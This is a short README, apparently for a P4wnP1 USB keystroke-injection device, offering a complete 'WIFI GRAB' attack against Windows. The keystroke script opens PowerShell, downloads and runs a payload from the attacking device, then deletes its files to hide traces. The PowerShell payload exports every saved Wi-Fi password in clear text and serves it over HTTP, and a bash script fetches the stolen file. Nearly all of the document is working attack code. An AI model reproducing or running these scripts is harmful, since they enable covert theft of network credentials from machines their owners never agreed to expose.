# WIFI GRAB
This script has been written in javascript adapted to P4wnP1 language in order to be ran in a Windows desktop environment

# Shellscript
```bash
#!/bin/bash

# This script has been developed by Ernest Anguera and Isaac Leon

# We create a "web server" with python3 to download the d.ps1 file
timeout 10 python3 -m http.server 8921

# Downloads the file that contains all wifi passwords
wget http://172.16.0.2:8213/wifipass.txt
```

# Script in Javascript
```js
llayout('es');            // Spanish keyboard layout
typingSpeed(10)    // Wait 10ms between keystrokes

delay(500)
// Opens the Windows Run prompt.
press("GUI r")
// Delays 0.2 seconds to give the Run prompt time to open.
delay(2000)
// this command will download the text and save as d.ps1 then run
// if the script failed to run change the ExecPolicy to Bypass
type("powershell")
delay(1000)
press("ENTER")
delay(1000)
type("wget http://172.16.0.1:8921/d.ps1 -o d.ps1")
delay(100)
press("ENTER")
type("./d.ps1")
delay(1000)
press("ENTER")
delay(10000)
press("CONTROL c")
delay(1000)
type("cd ..")
delay(1000)
press("ENTER")
delay(1000)
type("rmdir wipass")
delay(1000)
press("ENTER")
delay(1000)
type("S")
delay(1000)
press("ENTER")
delay(1000)
type("rm d.ps1")
delay(1000)
press("ENTER")
delay(1000)
type("exit")
delay(1000)
press("ENTER")
```

The payload used for this script:
```powershell
# All the files will be saved in this directory
$p = "C:\wipass"
mkdir $p
cd $p

# Get all saved wifi password
netsh wlan export profile key=clear
dir *.xml |% {
$xml=[xml] (get-content $_)
$a= "========================================`r`n SSID = "+$xml.WLANProfile.SSIDConfig.SSID.name + "`r`n PASS = " +$xml.WLANProfile.MSM.Security.sharedKey.keymaterial
Out-File wifipass.txt -Append -InputObject $a
}

python3 -m http.server 8213
```
